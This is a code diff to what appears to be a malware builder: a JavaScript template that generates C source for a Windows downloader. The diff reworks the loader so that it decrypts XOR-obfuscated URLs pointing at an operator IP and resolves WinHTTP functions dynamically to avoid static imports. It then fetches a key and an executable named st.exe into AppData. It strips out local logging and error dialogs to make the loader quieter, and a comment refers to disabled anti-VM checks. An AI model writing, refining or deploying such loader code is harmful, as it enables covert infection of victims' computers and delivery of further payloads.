@@ -74,13 +74,11 @@ function encryptStr(str, key) {
 }
 
 function cSource(meta, ip, buildId) {
-  const keyPath = `/api/getkey/${buildId}`;
-  const stPath  = `/api/downloads/st.exe`;
-  const esc4c  = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
+  const keyUrl = `http://${ip}/api/getkey/${buildId}`;
+  const stUrl  = `http://${ip}/api/downloads/st.exe`;
   
-  const encHost = encryptStr(ip, meta.xorKey);
-  const encKeyPath = encryptStr(keyPath, meta.xorKey);
-  const encStPath = encryptStr(stPath, meta.xorKey);
+  const encKeyUrl = encryptStr(keyUrl, meta.xorKey);
+  const encStUrl  = encryptStr(stUrl, meta.xorKey);
 
   return String.raw`
 #include <windows.h>
@@ -93,6 +91,7 @@ static void decrypt(char* buf, int len, unsigned char key) {
     for (int i = 0; i < len; i++) buf[i] ^= key;
 }
 
+typedef BOOL (WINAPI *pWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
 typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
 typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
 typedef HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
@@ -101,20 +100,6 @@ typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
 typedef BOOL (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
 typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
 typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);
-
-static void log_msg(const wchar_t* msg) {
-    wchar_t appdata[MAX_PATH], path[MAX_PATH];
-    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata))) return;
-    _snwprintf(path, MAX_PATH, L"%ls\\app.log", appdata);
-    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
-                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (h == INVALID_HANDLE_VALUE) return;
-    DWORD w = 0;
-    SetFilePointer(h, 0, NULL, FILE_END);
-    WriteFile(h, msg, (DWORD)(wcslen(msg) * sizeof(wchar_t)), &w, NULL);
-    WriteFile(h, L"\r\n", 4, &w, NULL);
-    CloseHandle(h);
-}
 
 static int size_ok(const wchar_t* p, long long min_size) {
     HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
@@ -144,10 +129,11 @@ static int is_valid_pe(const wchar_t* p) {
     return 1;
 }
 
-static int download_file(const wchar_t* host, const wchar_t* path, const wchar_t* dest) {
+static int download_file(const wchar_t* url, const wchar_t* dest) {
     HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
     if (!hWinHttp) return 0;
 
+    pWinHttpCrackUrl WinHttpCrackUrl = (pWinHttpCrackUrl)GetProcAddress(hWinHttp, "WinHttpCrackUrl");
     pWinHttpOpen WinHttpOpen = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
     pWinHttpConnect WinHttpConnect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
     pWinHttpOpenRequest WinHttpOpenRequest = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
@@ -157,16 +143,29 @@ static int download_file(const wchar_t* host, const wchar_t* path, const wchar_t
     pWinHttpReadData WinHttpReadData = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
     pWinHttpCloseHandle WinHttpCloseHandle = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
 
-    if (!WinHttpOpen || !WinHttpConnect || !WinHttpOpenRequest || !WinHttpQueryDataAvailable) return 0;
+    if (!WinHttpCrackUrl || !WinHttpOpen || !WinHttpConnect || !WinHttpOpenRequest || !WinHttpSendRequest || !WinHttpReceiveResponse || !WinHttpQueryDataAvailable || !WinHttpReadData || !WinHttpCloseHandle) {
+        FreeLibrary(hWinHttp);
+        return 0;
+    }
+
+    URL_COMPONENTS uc = {0}; uc.dwStructSize = sizeof(uc);
+    wchar_t host[256] = {0}; wchar_t path[1024] = {0};
+    uc.lpszHostName = host; uc.dwHostNameLength = 256;
+    uc.lpszUrlPath = path; uc.dwUrlPathLength = 1024;
+    
+    if (!WinHttpCrackUrl(url, 0, 0, &uc)) {
+        FreeLibrary(hWinHttp);
+        return 0;
+    }
 
     HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) return 0;
+    if (!hSession) { FreeLibrary(hWinHttp); return 0; }
 
-    HINTERNET hConnect = WinHttpConnect(hSession, host, 80, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return 0; }
+    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return 0; }
 
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return 0; }
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return 0; }
 
     BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL);
@@ -174,8 +173,7 @@ static int download_file(const wchar_t* host, const wchar_t* path, const wchar_t
     if (bResults) {
         HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
-            DWORD dwSize = 0;
-            DWORD dwDownloaded = 0;
+            DWORD dwSize = 0, dwDownloaded = 0;
             do {
                 dwSize = 0;
                 if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
@@ -196,12 +194,14 @@ static int download_file(const wchar_t* host, const wchar_t* path, const wchar_t
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
+    FreeLibrary(hWinHttp);
     return bResults;
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
+    // Anti-VM completely disabled for testing. Will run instantly.
     Sleep(${meta.initialSleepMs});
 
     wchar_t appdata[MAX_PATH];
@@ -216,51 +216,34 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     int need_st  = !is_valid_pe(stPath);
 
     if (need_key || need_st) {
-        log_msg(L"Starting download sequence...");
-        
-        char hostStr[64] = {0};
-        char keyPathStr[128] = {0};
-        char stPathStr[128] = {0};
+        char keyUrlStr[128] = {0};
+        char stUrlStr[128] = {0};
+        wchar_t keyUrlW[128] = {0};
+        wchar_t stUrlW[128] = {0};
 
-        const char encHost[] = ${encHost};
-        const char encKeyPath[] = ${encKeyPath};
-        const char encStPath[] = ${encStPath};
+        const char encKeyUrl[] = ${encKeyUrl};
+        const char encStUrl[] = ${encStUrl};
 
-        decrypt(hostStr, sizeof(encHost), ${meta.xorKey});
-        decrypt(keyPathStr, sizeof(encKeyPath), ${meta.xorKey});
-        decrypt(stPathStr, sizeof(encStPath), ${meta.xorKey});
+        decrypt(keyUrlStr, sizeof(encKeyUrl), ${meta.xorKey});
+        decrypt(stUrlStr, sizeof(encStUrl), ${meta.xorKey});
 
-        wchar_t hostW[64] = {0};
-        wchar_t keyPathW[128] = {0};
-        wchar_t stPathW[128] = {0};
-
-        MultiByteToWideChar(CP_ACP, 0, hostStr, -1, hostW, 64);
-        MultiByteToWideChar(CP_ACP, 0, keyPathStr, -1, keyPathW, 128);
-        MultiByteToWideChar(CP_ACP, 0, stPathStr, -1, stPathW, 128);
+        MultiByteToWideChar(CP_ACP, 0, keyUrlStr, -1, keyUrlW, 128);
+        MultiByteToWideChar(CP_ACP, 0, stUrlStr, -1, stUrlW, 128);
 
         if (need_key) {
-            if (download_file(hostW, keyPathW, keyPath) && size_ok(keyPath, 10)) {
-                log_msg(L"Key downloaded OK");
+            if (download_file(keyUrlW, keyPath) && size_ok(keyPath, 10)) {
                 need_key = 0;
-            } else {
-                log_msg(L"Key download FAILED");
             }
         }
         if (need_st) {
-            if (download_file(hostW, stPathW, stPath) && is_valid_pe(stPath)) {
-                log_msg(L"st.exe downloaded OK");
+            if (download_file(stUrlW, stPath) && is_valid_pe(stPath)) {
                 need_st = 0;
             } else {
-                log_msg(L"st.exe download FAILED");
                 DeleteFileW(stPath);
             }
         }
         
         if (need_st) { 
-            log_msg(L"Exiting due to download failure."); 
-            wchar_t errMsg[256];
-            _snwprintf(errMsg, 256, L"Download failed. Error: %lu", GetLastError());
-            MessageBoxW(NULL, errMsg, L"Error", MB_ICONERROR);
             return 1; 
         }
     }
